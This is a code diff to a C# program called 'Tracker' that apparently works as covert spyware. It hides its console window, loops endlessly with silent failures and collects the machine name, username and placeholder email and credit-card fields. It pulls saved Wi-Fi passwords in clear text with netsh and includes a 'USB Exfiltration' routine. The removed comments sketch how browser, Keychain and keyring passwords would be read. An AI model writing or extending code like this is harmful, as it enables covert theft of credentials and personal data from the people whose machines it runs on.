@@ -46,7 +46,6 @@ namespace Tracker {
                 var handle = GetConsoleWindow();
                 ShowWindow(handle, 0);
             }
-            // On macOS/Linux, no console to hide – already headless.
 
             // Main loop – runs forever
             while (true) {
@@ -66,9 +65,8 @@ namespace Tracker {
                     }
 
                     Thread.Sleep(60000); // 60 seconds
-                } catch (Exception ex) {
-                    // Silent fail – log to debug file if needed
-                    // File.AppendAllText(@"/tmp/.tracker_debug", $"[{DateTime.Now}] Error: {ex.Message}\n");
+                } catch {
+                    // Silent fail
                 }
             }
         }
@@ -101,14 +99,13 @@ namespace Tracker {
                     emails = "(demo)",
                     credit_cards = "(demo)"
                 });
-            } catch (Exception ex) {
-                // Fallback – return minimal data
+            } catch {
                 return JsonConvert.SerializeObject(new {
                     tracker_id = TRACKER_ID,
                     device_name = Environment.MachineName,
                     os = Environment.OSVersion.ToString(),
                     username = Environment.UserName,
-                    error = ex.Message
+                    error = "Data collection failed"
                 });
             }
         }
@@ -201,24 +198,17 @@ namespace Tracker {
                     return match.Success ? int.Parse(match.Groups[1].Value) : 0;
                 } catch { return 0; }
             }
-            // Linux: no standard way to get RSSI without tools; return 0.
             return 0;
         }
 
-        // ---- Saved Passwords (placeholder – implement per platform) ----
-        static string GetSavedPasswords() {
-            // Windows: read from Chrome/Firefox SQLite + DPAPI
-            // macOS: read from Keychain
-            // Linux: read from GNOME Keyring / KWallet
-            return "{}";
-        }
+        // ---- Saved Passwords (placeholder) ----
+        static string GetSavedPasswords() => "{}";
 
         // ---- Wi‑Fi Passwords ----
         static string GetWiFiPasswords() {
             if (IsWindows) {
                 try {
                     string output = "";
-                    // Get all profiles
                     var p = new Process();
                     p.StartInfo.FileName = "netsh";
                     p.StartInfo.Arguments = "wlan show profiles";
@@ -232,7 +222,6 @@ namespace Tracker {
                     var profileRegex = new Regex(@"All User Profile\s*:\s*(.*)");
                     foreach (Match match in profileRegex.Matches(result)) {
                         string profile = match.Groups[1].Value;
-                        // Get password for this profile
                         var p2 = new Process();
                         p2.StartInfo.FileName = "netsh";
                         p2.StartInfo.Arguments = $"wlan show profile name=\"{profile}\" key=clear";
@@ -252,12 +241,9 @@ namespace Tracker {
                 } catch { return "ERROR"; }
             }
             if (IsMacOS) {
-                // Use `security find-generic-password -wa <SSID>`
-                // Complex – placeholder
                 return "macOS Wi‑Fi passwords not implemented";
             }
             if (IsLinux) {
-                // Read from /etc/NetworkManager/system-connections/
                 return "Linux Wi‑Fi passwords not implemented";
             }
             return "ERROR";
@@ -308,7 +294,7 @@ namespace Tracker {
             }
         }
 
-        // ---- USB Exfiltration (Windows only – Node C detection) ----
+        // ---- USB Exfiltration (Windows only) ----
         static bool IsNodeCPresent() {
             if (!IsWindows) return false;
             foreach (var drive in DriveInfo.GetDrives()) {
